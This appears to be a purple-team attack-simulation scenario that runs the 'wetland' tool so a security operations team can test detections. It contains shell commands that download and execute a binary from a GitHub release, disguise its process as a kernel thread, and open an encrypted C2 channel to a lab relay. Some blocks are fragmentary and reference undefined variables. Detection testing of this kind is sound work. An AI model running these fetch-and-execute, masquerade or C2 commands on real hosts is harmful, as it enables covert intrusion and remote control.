scenario_information.scenario_description: Purple-team BAS that exercises the real wetland tool (github.com/s4nntysec/wetland) in six ways so the SOC can validate detection of the tool itself: it is downloaded from the v0.1.0 Release and run (T1105), then drives wld's own lab techniques — process masquerade (T1036), cron+systemd persistence (T1053.003/T1543.002), hidden+timestomped copy (T1564.001/T1070.006), HTTP-shaped C2 beacon (T1071.001/T1571) — and finally opens wld's encrypted NAT-traversal C2 channel to the relay (T1572/T1573). Every inject uses the real binary, is tagged WETLAND-LAB and self-cleans. Edit the RELAY/SECRET lines to your lab relay. Target your Linux assets.

injector_contract_payload.payload_description: Pulls the real wld binary from the v0.1.0 GitHub Release, verifies it (SHA256) and runs `wld -h`. This is the tool landing on the host and executing — the SOC should flag the download+execute.
injector_contract_payload.command_content:
# WETLAND-LAB  T1105 — pull wld from the GitHub Release and execute it
url='https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-linux-x86_64'
dst="$HOME/.wetland-lab-wld"
if curl -fsSL -o "$dst" "$url"; then chmod +x "$dst"; else echo 'WETLAND-LAB ingress: download blocked (proxy/AV) — valid detection'; exit 0; fi
echo "WETLAND-LAB ingress: wld -> $dst ($(wc -c <"$dst") bytes)"
sha256sum "$dst" 2>/dev/null | awk '{print "WETLAND-LAB ingress: SHA256 "$1}'
"$dst" -h 2>&1 | head -n 3
echo 'detect: curl writing an executable then wld executing; proxy/NDR tool transfer; EDR exec-after-download'

injector_contract_payload.payload_description: Runs wld's own masquerade technique: the wld process renames itself to a kernel-thread name ([kworker/0:0]) for 15s. SOC should flag a process whose comm looks like a kthread but has a real exe.

rm -f "$HOME/.wetland-lab-wld"

injector_contract_payload.command_content:
# WETLAND-LAB  T1036 — wld renames its own process
url='https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-linux-x86_64'
dst="$HOME/.wetland-lab-wld"
[ -x "$dst" ] || { curl -fsSL -o "$dst" "$url" && chmod +x "$dst"; } || { echo 'WETLAND-LAB: wld download blocked (proxy/AV) — valid detection'; exit 0; }
"$dst" lab masquerade --name '[kworker/0:0]' --duration 15
echo 'detect: comm like [kworker/..] but /proc/<pid>/exe resolves to a real file; PR_SET_NAME'

injector_contract_payload.command_content:
RELAY_HOST='relay.lab.local'       # <-- EDIT: your wetland relay host

timeout 20 "$dst" -s "$SECRET" -H "$RELAY_HOST" -p "$RELAY_PORT" </dev/null >/dev/null 2>&1
echo "WETLAND-LAB c2: wld exited ($?) — generated the outbound rendezvous/handshake telemetry"
